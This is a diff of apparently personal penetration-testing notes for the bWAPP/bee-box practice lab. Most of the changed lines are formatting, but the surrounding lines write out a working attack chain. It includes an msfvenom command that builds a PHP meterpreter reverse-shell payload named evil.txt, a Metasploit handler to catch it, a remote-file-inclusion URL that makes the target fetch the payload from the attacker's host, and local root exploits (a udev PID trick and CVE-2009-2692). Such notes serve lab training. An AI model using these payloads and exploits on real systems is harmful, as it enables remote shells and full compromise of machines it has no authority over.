@@ -1,4 +1,4 @@
-BeeBox
+*BeeBox*
 "/multi/handler" can be used for txt file reverse shell
 
 msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.112.4 LPORT=4446 -f raw -o /var/www/html/evil.txt
@@ -9,7 +9,8 @@ set LHOST 192.168.112.4
 set PAYLOAD php/meterpreter_reverse_tcp
 run
 
-***Remote & Local File Inclusion (RFI/LFI)
+***Remote & Local File Inclusion (RFI/LFI)***
+
 http://192.168.1.135/bWAPP/rlfi.php?language=lang_en.php&action=go
 ?language=http://192.168.112.4/evil.txt
 
@@ -35,7 +36,7 @@ ps aux | grep udev
 ./privescalation (PID discovered with grep minus 1 - e.g. 2864 - 1 = 2863)
 
 
-
+**Easy Way**
 tar -xvf cve-2009-2692.tar
 cd cve-2009-2692
 sh cve-2009-2692.sh
